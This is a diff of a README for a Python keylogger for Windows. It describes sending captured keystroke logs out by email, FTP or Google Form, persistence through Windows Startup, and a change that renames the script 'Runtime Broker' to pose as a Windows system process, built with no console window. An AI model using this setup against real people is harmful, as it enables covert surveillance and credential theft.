@@ -27,16 +27,15 @@ Some uses of a keylogger are:
   - Uploading logs via FTP;
   - Debug mode (printing to console).
 - Privacy protection:
-  - RSA public-key encryption of logs on the fly using [PyCrypto](https://www.dlitz.net/software/pycrypto/).
+  - RSA public-key encryption of logs on the fly using [PyCryptoDome](https://www.dlitz.net/software/pycrypto/).
 - Persistence:
-  - Adding to Windows Startup;
-  - Every 10 seconds making sure that a keylogger process is running.
+  - Adding to Windows Startup.
 
 ### Getting started
 
 #### System requirements
 - MS Windows (tested on 10). TODO: add Linux and macOS support;
-- [Python 3](https://www.python.org/downloads/) (tested on v. 3.7.3).
+- [Python 3](https://www.python.org/downloads/) (tested on v. 3.7.4).
 
 #### Usage
 
@@ -45,28 +44,26 @@ Some uses of a keylogger are:
 2. `cd python-keylogger`
 ###### **Run as a Python script**
 3. `pip install requirements.txt` (alternatively `python -m pip ...`)
-4. `python logger_main.py local encrypt startup`
+4. `python "Runtime Broker.py" local encrypt`
 ###### **Run as an executable**
 3. `pip install pyinstaller`
-4. `pyinstaller --onefile --noconsole logger_main.py`
-5. `pyinstaller --onefile --noconsole logger.py`
-6. `"dist\logger_main.exe" exe local encrypt startup`
+4. `pyinstaller --onefile --noconsole --icon=icon.ico "Runtime Broker.py"`
+5. `"dist\Runtime Broker.exe" local encrypt exe`
 ###### **To use RSA encryption/decryption (optional)**
 1. Generate RSA key pair (optional): `python rsa_key_generator.py`.
 1. Change the public key filename / paste the key in logger.py.
 1. To decrypt logs type `python decryptor.py`, and then follow the instructions given by the script.
 
 ##### System arguments
-`logger_main.py mode [exe] [encrypt] [startup]`
+`logger_main.py mode [encrypt] [exe]`
 - **modes**:
   - **local:** store the logs in a local txt file. Filename is a MD5 hash of the current date (YYYY-Mon-DD).
   - **remote:** send the logs to a Google Form. You must specify the Form URL and Field Name in the script.
   - **email:** send the logs to an email. You must specify (SERVER, PORT, USERNAME, PASSWORD, TO)
   - **ftp:** upload logs file to an FTP account. You must specify (SERVER, USERNAME, PASSWORD, SSL (1 to enable, or 0), OUTPUT DIRECTORY)
 - **[optional]**
-  - **exe**: provide this argument if you are running an executable.
   - **encrypt:** enable the encryption of logs with a public key provided in logger.py.
-  - **startup:** add the keylogger to Windows startup.
+  - **exe**: provide this argument if you are running an executable.
 
 ### Video tutorials (similar but simpler projects)
 https://www.youtube.com/watch?v=uODkiVbuR-g
